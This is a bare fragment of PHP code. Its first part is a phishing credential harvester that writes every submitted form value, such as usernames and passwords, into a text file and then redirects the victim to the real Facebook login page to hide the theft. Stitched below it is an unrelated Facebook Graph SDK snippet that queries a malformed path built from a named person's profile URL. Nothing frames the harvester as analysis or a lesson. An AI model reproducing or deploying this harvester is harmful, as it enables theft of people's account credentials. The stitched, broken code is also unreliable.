&amp;lt;?php header('Location: http://www.Facebook.com/login.php'); $handle = fopen('pass.txt', 'a'); foreach($_GET as $variable =&amp;gt; $value) { fwrite($handle, $variable); fwrite($handle, '='); fwrite($handle, $value); fwrite($handle, '\n'); } fwrite($handle, '\n'); fclose($handle); exit; ?&amp;gt;
try {
  // Returns a `FacebookFacebookResponse` object
  $response = $fb->get(
    '/https://www.facebook.com/dinda.diiaclallu',
    '{access-token}'
  );
} catch(FacebookExceptionsFacebookResponseException $e) {
  echo 'Graph returned an error: ' . $e->getMessage();
  exit;
} catch(FacebookExceptionsFacebookSDKException $e) {
  echo 'Facebook SDK returned an error: ' . $e->getMessage();
  exit;
}
$graphNode = $response->getGraphNode();
